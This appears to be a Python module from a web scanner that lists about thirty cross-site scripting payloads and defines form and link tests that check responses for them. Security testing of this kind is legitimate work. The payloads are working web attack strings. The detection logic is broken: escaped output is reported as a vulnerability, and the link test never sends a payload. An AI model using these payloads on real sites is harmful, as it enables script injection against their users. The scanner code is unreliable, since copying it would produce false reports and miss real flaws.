import html
from typing import List, Tuple

PAYLOADS = {
    # Regular XSS payloads
    "<sCript>alert('XSS PAYLOAD form')</scriPt>",
    '<marquee onmouseover=alert(1)>',
    '<svg/onload=alert(1)>',
    "<scr<script>ipt>alert('XSS PAYLOAD form')</scri</script>pt>",
    '<marquee onstart=alert(1)>',
    '<svg/onload=confirm(1);>',
    '<input onmousemove=alert(1)>',
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    # XSS payloads using various tags
    '<html><script>alert(1)</script></html>',
    '<body onload=alert(1)>',
    '<iframe onbeforeload=alert(1)>',
    '<object onerror=alert(1)>',
    # Base64-encoded XSS payloads
    'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'PGEgaHJlZj0iaHR0cDovL3d3dy5tZWRpYS5zZSI+',
    'PCFET0NUWVBFIGh0bWwg',
    # Additional XSS payloads
    '<img src=x onerror=alert(1);>',
    '<a href=javascript:alert(1);>',
    '<body background=javascript:alert(1);>',
    '<input type=image src= onerror=alert(1);>',
    '<isindex action=javascript:alert(1);>',
    '<layer src=javascript:alert(1);>',
    '<xml id=xx><x:script><!ENTITY xxe "test"></x:script></xml>',
    "<img src='x' onerror='alert(1)'>",
    "<body onload='alert(1)'>",
    "<iframe src='javascript:alert(1)'>",
    "<svg onload='alert(1)'>",
    "<div style='width:100px;height:100px;background:url(javascript:alert(1))'>",
}

PREFIXES = {"?name=",
            "?test=",
            "<script>",
            "<img src"}


def test_xss_in_form(self, form: str, url: str) -> List[Tuple[bool, str]]:
    """
    Test for Cross-Site Scripting (XSS) vulnerabilities in a web form.

    This function submits various payloads that could potentially execute JavaScript in a user's browser
    if the input is not properly sanitized. After each submission, it checks the response for the payload or its HTML-escaped equivalent.
    If either is found in the response, the corresponding payload is added to the results.

    Args:
        form (str): The web form to test.
        url (str): The URL to submit the form to.

    Returns:
        List[Tuple[bool, str]]: A list of tuples. Each tuple contains a boolean indicating whether the payload was found in the response,
                                 and the payload that was used.
    """
    results = []
    for payload in PAYLOADS:
        response = self.submit_form(form=form, value=payload, url=url)
        if payload in response.text or html.escape(payload) in response.text:
            results.append((True, payload))
        else:
            results.append((False, payload))

    return [result for result in results if result[0]]


def test_xss_in_link(self, url: str) -> List[Tuple[bool, str]]:
    """
    Test for Cross-Site Scripting (XSS) vulnerabilities in links.

    This function appends various payloads to a URL and checks the response for the payload or its HTML-escaped equivalent.
    If either is found in the response, the corresponding payload is added to the results.

    Args:
        url (str): The URL to test.

    Returns:
        List[Tuple[bool, str]]: A list of tuples. Each tuple contains a boolean indicating whether the payload was found in the response,
                                 and the payload that was used.
    """

    results = []
    for prefix in PREFIXES:
        response = self.session.get(url=f"{url}{prefix}")

        for payload in PAYLOADS:
            if payload in response.text or html.escape(payload) in response.text:
                results.append((True, payload))
            else:
                results.append((False, payload))

    return [result for result in results if result[0]]
